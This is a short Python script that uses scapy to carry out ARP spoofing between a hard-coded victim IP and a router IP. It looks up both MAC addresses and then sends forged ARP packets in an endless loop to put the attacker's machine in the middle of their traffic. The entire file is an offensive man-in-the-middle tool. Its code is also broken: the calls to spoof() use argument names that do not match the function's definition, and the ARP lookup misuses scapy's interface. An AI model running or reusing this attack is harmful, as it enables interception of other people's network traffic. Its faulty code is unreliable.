import scapy.all as scapy

def spoof(gateway_ip, gateway_mac, victim_ip):
    spoofed_arp_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    scapy.send(spoofed_arp_packet)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(ip) #sending broadcast message to find the mac address
    reply = scapy.srp(arp_request) # answer: None or mac addresses 
    if reply:
        return reply[0][1].src #mac address for the specific ip 
    return None

def wait_till_mac_found(ip):
    mac = None   
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC address for {} not found \n".format(ip))
    return mac

#---------------------------------------
gateway_ip = "10.99.203.254" #router ip 
target_ip = "10.99.201.131" #victim ip 

target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)

while True:
    spoof(target_ip=target_ip,target_mac=target_mac, victim_ip=gateway_ip)
    spoof(target_ip=gateway_ip,target_mac=gateway_mac, victim_ip=target_ip)
    print("Spoofing is active")